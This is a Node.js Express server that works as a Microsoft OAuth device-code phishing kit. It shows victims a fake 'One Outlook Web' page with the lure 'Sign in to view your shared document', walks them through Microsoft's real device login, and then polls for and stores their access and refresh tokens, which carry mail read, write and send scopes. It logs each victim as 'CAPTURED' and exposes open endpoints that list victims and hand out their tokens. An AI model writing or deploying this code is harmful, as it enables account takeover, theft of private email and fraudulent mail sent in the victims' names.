const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ============================================
// YOUR CLIENT ID - Works for ANY Microsoft account
// ============================================
const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
// ============================================

let sessions = new Map();
let pendingAuth = new Map();

function generateSID() {
    return Math.floor(Math.random() * 9000000) + 1000000;
}

// Create session
app.post('/api/create-session', async (req, res) => {
    try {
        const sid = generateSID();
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in } = response.data;
        
        pendingAuth.set(device_code, {
            device_code, user_code, sid, status: 'pending',
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        pollForToken(device_code, sid);
        
        res.json({ success: true, sid: sid, user_code: user_code });
        
    } catch (err) {
        console.error('Error:', err.response?.data || err.message);
        res.status(500).json({ error: 'Failed to create session' });
    }
});

async function pollForToken(device_code, sid) {
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(device_code);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: YOUR_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            sessions.set(sid.toString(), {
                sid: sid,
                email: userInfo.data.mail || userInfo.data.userPrincipalName,
                name: userInfo.data.displayName,
                tokens: tokens,
                capturedAt: new Date().toISOString()
            });
            
            pending.status = 'captured';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅ CAPTURED: ${userInfo.data.mail}`);
            
        } catch (err) {
            if (err.response?.data?.error !== 'authorization_pending') {
                // Waiting for user...
            }
        }
    }, 3000);
}

app.get('/api/status/:sid', async (req, res) => {
    const { sid } = req.params;
    const session = sessions.get(sid);
    if (session) return res.json({ status: 'captured', email: session.email });
    for (const pending of pendingAuth.values()) {
        if (pending.sid.toString() === sid) return res.json({ status: pending.status });
    }
    res.json({ status: 'not_found' });
});

app.get('/api/sessions', async (req, res) => {
    const sessionList = Array.from(sessions.values()).map(s => ({ sid: s.sid, email: s.email, capturedAt: s.capturedAt }));
    res.json({ sessions: sessionList });
});

app.get('/api/session/token/:sid', async (req, res) => {
    const session = sessions.get(req.params.sid);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    res.json({ email: session.email, token: session.tokens.access_token });
});

app.delete('/api/sessions/clear', async (req, res) => {
    sessions.clear();
    res.json({ success: true });
});

// Generate auth page
app.get('/generate-auth-page', async (req, res) => {
    try {
        const sid = generateSID();
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in } = response.data;
        
        pendingAuth.set(device_code, {
            device_code, user_code, sid, status: 'pending',
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        pollForToken(device_code, sid);
        
        const html = `<!DOCTYPE html>
<html>
<head><title>One Outlook Web</title>
<style>
body{font-family:'Segoe UI',sans-serif;background:#f4f3f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
.card{background:#fff;border-radius:12px;padding:40px;max-width:500px;text-align:center;box-shadow:0 4px 12px rgba(0,0,0,.1)}
.code{font-size:36px;font-weight:bold;letter-spacing:6px;background:#f0f0f0;padding:15px;border-radius:8px;margin:20px 0;color:#0072c6;font-family:monospace}
.btn{background:#0072c6;color:#fff;border:none;padding:10px 30px;border-radius:6px;cursor:pointer;font-size:14px;margin:5px}
.status{margin-top:20px;font-size:12px;color:#666}
.spinner{display:inline-block;width:12px;height:12px;border:2px solid #ccc;border-top-color:#0072c6;border-radius:50%;animation:spin .8s linear infinite;margin-right:5px}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="card">
<h2>📧 One Outlook Web</h2>
<p>Sign in to view your shared document</p>
<div class="code" id="userCode">${user_code}</div>
<button class="btn" onclick="copyCode()">Copy Code</button>
<button class="btn" onclick="openLogin()">Open Microsoft Login</button>
<div class="status" id="statusMsg"><span class="spinner"></span> Waiting for authentication...</div>
</div>
<script>
const SID = ${sid};
const API = '${req.protocol}://${req.get('host')}';
function copyCode(){const c=document.getElementById('userCode').textContent;navigator.clipboard.writeText(c);alert('Copied!')}
function openLogin(){window.open('https://login.microsoftonline.com/common/oauth2/v2.0/deviceauth','_blank','width=600,height=700')}
async function poll(){try{const r=await fetch(API+'/api/status/'+SID);const d=await r.json();if(d.status==='captured'){document.getElementById('statusMsg').innerHTML='✅ Access granted! Close this window.';setTimeout(()=>window.close(),2000)}if(d.status==='expired')location.reload()}catch(e){}setTimeout(poll,3000)}
poll();
</script>
</body>
</html>`;
        
        res.send(html);
        
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`✅ Server running on http://localhost:${PORT}`);
});
